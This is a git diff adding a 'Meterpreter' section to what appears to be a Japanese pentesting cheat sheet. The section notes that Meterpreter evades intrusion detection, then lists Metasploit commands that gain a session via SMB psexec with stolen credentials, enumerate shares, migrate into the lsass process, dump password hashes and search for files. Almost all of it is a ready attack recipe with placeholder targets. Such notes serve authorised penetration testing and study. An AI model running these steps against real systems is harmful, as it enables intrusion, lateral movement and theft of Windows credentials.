@@ -831,3 +831,36 @@ run
 # ハッシュダンプ取得
 run post/linux/gather/hashdump
 ```
+
+## Meterpreter
+
+- メモリ上で起動する。IDSで検出されづらい。最近のIDSは検出できる。
+
+```bash
+msfvenom --list payloads | grep meterpreter
+
+msfconsole
+use exploit/windows/smb/psexec
+set RHOSTS [target IP]
+set SMBUSer [target user]
+set SMBPass [target pw]
+exploit
+
+sysinfo
+
+# 共有列挙
+back
+use post/windows/gather/enum_shares
+set SESSION 1
+run
+
+# ハッシュ取得
+sessions -i 1
+getpid
+ps | grep lsass
+migrate [lsass PID]
+hashdump
+
+# ファイル検索
+search -f [対象ファイル名]
+```
